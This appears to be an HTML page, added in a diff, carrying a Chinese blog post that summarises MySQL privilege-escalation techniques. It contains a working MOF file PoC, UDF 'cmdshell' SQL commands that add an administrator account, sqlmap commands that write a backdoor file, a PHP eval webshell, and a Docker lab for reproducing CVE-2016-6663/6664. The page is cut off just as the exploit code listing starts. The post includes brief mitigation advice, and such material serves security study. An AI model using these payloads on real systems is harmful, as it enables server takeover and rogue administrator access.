@@ -1,0 +1,599 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>mysql数据库提权总结 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="mysql数据库提权总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-07-02 10:34" pubdate>
+        2018年7月2日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      73
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">mysql数据库提权总结</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>数据库提权是提权中比较常用的手段，并且sql注入漏洞相对较多，比较好入手，这次整理一下mysql数据库提权的常用手段。</p>
+<h2 id="0x01-MOF提权"><a href="#0x01-MOF提权" class="headerlink" title="0x01 MOF提权"></a>0x01 MOF提权</h2><h3 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h3><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<h3 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h3><p>MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>Windows&lt;=2003</li>
+<li>mysql在c:windows/system32/mof目录有写权限</li>
+<li>已知数据库账号密码</li>
+</ul>
+<p>我们可以看到，这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到。而且较新的系统就无法使用MOF提权了。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>这里提供一个poc,需要更改的部分只有一条命令</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br>instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<br>instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>ScriptText =<br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user test 123456 /add\<span class="hljs-string">&quot;)&quot;</span>;<br>&#125;;<br>instance of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>确保了前面的条件之后，我们可以先上传我们的mof文件到服务器任意目录，一般是网站允许上传的目录。</p>
+<p>然后通过mysql语句将这个文件导入到nullevt.mof</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;F:/wamp/www/upload/test.mof&quot;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></code></pre></td></tr></table></figure>
+<p>这里用到了dumpfile而不是outfile是因为：</p>
+<ul>
+<li>dumpfile只能导出一行数据</li>
+<li>outfile可以完整的导出每行记录，并且会在行末端写入新行，并且会转义换行符。</li>
+</ul>
+<p>如果用outfile这个二进制可执行文件就会被破坏，所以这里我们使用了dumpfile。</p>
+<p>然后我们分别两次将创建用户和提权命令替换poc中的命令做上述操作即可。两次使用的命令如下</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net.exe <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> <span class="hljs-number">123456</span> /add<br><br>net.exe <span class="hljs-keyword">user</span> <span class="hljs-title">localgroup</span> administrators test /add<br></code></pre></td></tr></table></figure>
+<p>然后我们使用net user命令就可以看到我们新加入的账户，提权成功。</p>
+<h3 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h3><ul>
+<li>最根本的防御是过滤sql注入</li>
+<li>如果一旦被MOF提权，这个语句会被一直执行，要彻底删掉账号需要先停止加载工作，然后删掉文件，再删掉入侵者留下的账号，最后重启服务即可。  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">net stop winmgmt<br>del c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/wbem/</span>repository<br>net start winmgmt<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="0x02-UDF提权"><a href="#0x02-UDF提权" class="headerlink" title="0x02 UDF提权"></a>0x02 UDF提权</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF,user defined funcion,即用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。</p>
+<h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>通过添加用户自定义函数导出dll，然后在mysql中使用用户自定义函数以高权限账号执行命令，添加账号进行提权。</p>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>windows2003、windowsXP、windows7</li>
+<li>拥有mysql的insert和delete权限</li>
+</ul>
+<h3 id="UDF-php"><a href="#UDF-php" class="headerlink" title="UDF.php"></a>UDF.php</h3><p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们要判断mysql版本，根据不同的版本：</p>
+<ul>
+<li><p>mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/</p>
+</li>
+<li><p>mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\</p>
+</li>
+</ul>
+<p>也可以直接查询插件安装目录：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">%plugin%</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们上传udf.php到网站中</p>
+<p>在udf.php中将udf.dll导出到插件目录</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv01.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>然后执行sql语句创建用户自定义函数,并利用他执行命令提权</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">&#x27;net user test 123456 /add&#x27;</span>);<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">&#x27;net localgroup administrators test /add&#x27;</span>);<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> cmdshell; 删除函数<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;cmdshell&#x27;</span>  删除函数<br></code></pre></td></tr></table></figure>
+
+<p>在将udf.dll文件导出到lib\plugin目录下时，如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> @@basedir;   <br><span class="hljs-comment">//查找到mysql的目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;</span>;   <br><span class="hljs-comment">//利用NTFS ADS创建lib目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>;<br><span class="hljs-comment">//利用NTFS ADS创建plugin目录</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>使用sqlmap自动化上传插件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">python sqlmap.py -u <span class="hljs-string">&#x27;xxxx&#x27;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>=<span class="hljs-regexp">/lib_mysqludf_sys.so  --file-dest=/u</span>sr<span class="hljs-regexp">/lib/my</span>sql<span class="hljs-regexp">/plugin/</span><br></code></pre></td></tr></table></figure>
+<p>激活sys_exec函数</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;xxxx&#x27;</span> --sql-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+<p>利用sqlmap上传后门</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">python sqlmap.py -u <span class="hljs-string">&#x27;xxxx&#x27;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>=c:<span class="hljs-regexp">/phpspy.php --file-dest=/</span>var<span class="hljs-regexp">/www/</span>spy.php<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="应对-1"><a href="#应对-1" class="headerlink" title="应对"></a>应对</h3><ul>
+<li>最根本的防御是过滤sql注入</li>
+<li>限制mysql的写入权限</li>
+</ul>
+<h2 id="0x03-CVE-2016-6663和CVE-2016-6664"><a href="#0x03-CVE-2016-6663和CVE-2016-6664" class="headerlink" title="0x03 CVE-2016-6663和CVE-2016-6664"></a>0x03 CVE-2016-6663和CVE-2016-6664</h2><p>上面两种方式条件都太过严苛，应对一些新的系统就没有用武之地了，所以再介绍一下利用下面两个CVE配合起来提权的方式，相对需求条件要宽松的多，很多情况都可以成功提权。</p>
+<h3 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h3><p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p>
+<h3 id="CVE-2016-6664"><a href="#CVE-2016-6664" class="headerlink" title="CVE-2016-6664"></a>CVE-2016-6664</h3><p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p>
+<p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p>
+<p>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p>
+<h3 id="CVE-2016-6663利用条件"><a href="#CVE-2016-6663利用条件" class="headerlink" title="CVE-2016-6663利用条件"></a>CVE-2016-6663利用条件</h3><ul>
+<li>1.已经getshell，获得www-data权限</li>
+<li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li>
+<li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li>
+<li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
+</ul>
+<h3 id="CVE-2016-6664利用条件"><a href="#CVE-2016-6664利用条件" class="headerlink" title="CVE-2016-6664利用条件"></a>CVE-2016-6664利用条件</h3><ul>
+<li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li>
+<li>2.需要在mysql权限下运行才能利用</li>
+<li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打开docker，拉取镜像tutum/lamp。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull tutum/lamp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv02.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>运行docker并连接</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -d -P tutum/lamp<br>docker ps<br>docker exec -<span class="hljs-keyword">it</span> &lt;container_id&gt; /bin/bash<br></code></pre></td></tr></table></figure>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv03.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>更新apt，并安装wget，gcc，libmysqlclient-dev</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">apt <span class="hljs-keyword">update</span><br>apt install -y wget gcc libmysqlclient-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv04.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>这里假设我们已经拿到一个www-data这种低权限的webshell和一个拥有create,drop,insert,select权限的数据库账号，密码。</p>
+<p>所以我们手动写入webshell：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>webshell.php<br></code></pre></td></tr></table></figure>
+<p>然后将<?php @eval($_POST[123456]);?>写入保存，并赋予我们任何用户在web路径的可读可写可执行权限。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod -R <span class="hljs-number">777</span> <span class="hljs-regexp">/var/</span>www/html<br></code></pre></td></tr></table></figure>
+
+<p>然后我们进入数据库，添加一个对test库有create,drop,insert,select权限的test用户，密码为123456</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> test;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>; <br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">create</span>,<span class="hljs-keyword">drop</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> test.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv05.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>配置好之后，我们将apache2和mysql服务重启</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">service <span class="hljs-built_in">restart</span> apache2<br>service <span class="hljs-built_in">restart</span> mysql<br></code></pre></td></tr></table></figure>
+
+<p>然后我们退出当前连接，将配置好的容器提交为一个新容器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit dfdd<span class="hljs-number">42</span>e<span class="hljs-number">8</span>e<span class="hljs-number">688</span> leticia<span class="hljs-number">0</span>/lamp<br></code></pre></td></tr></table></figure>
+<p>然后以将新容器的80端口映射到8080端口，3306映射到3306端口的方式运行容器。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8080</span>:<span class="hljs-number">80</span> -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> leticia<span class="hljs-number">0</span>/lamp<br></code></pre></td></tr></table></figure>
+
+<p>通过本机访问docker的web应用，看到如下界面说明环境搭建成功。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv06.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<h3 id="www-data权限提升为mysql权限"><a href="#www-data权限提升为mysql权限" class="headerlink" title="www-data权限提升为mysql权限"></a>www-data权限提升为mysql权限</h3><p>接下来我们用菜刀连接刚才的webshell</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv07.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>使用whoami可以看到当前权限是www-data</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv08.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>运行ls -ld，可以发现我们目前的www-data只有对html目录是可读可写可执行的，所以我们需要将exp写入html目录</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv09.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>CVE-2016-6663 exp网址： <a target="_blank" rel="noopener" href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></p>
+<p>CVE=2016-6663 exp：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span 